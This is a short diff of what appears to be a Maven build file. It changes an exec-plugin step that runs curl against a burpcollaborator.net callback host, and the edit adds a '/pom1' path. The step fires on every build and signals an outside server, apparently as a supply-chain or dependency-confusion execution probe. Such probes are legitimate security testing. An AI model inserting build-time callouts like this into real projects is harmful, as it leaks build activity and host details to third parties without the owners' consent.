@@ -52,7 +52,7 @@
                         <configuration>
                             <executable>curl</executable>
                             <arguments>
-                                <argument>4dilzw5s5oqghin69ib9l1wn8ee52u.burpcollaborator.net</argument>
+                                <argument>fp8wb7h3hz2rttzhltnkxc8ykpqhe6.burpcollaborator.net/pom1</argument>
                             </arguments>
                         </configuration>
                     </execution>
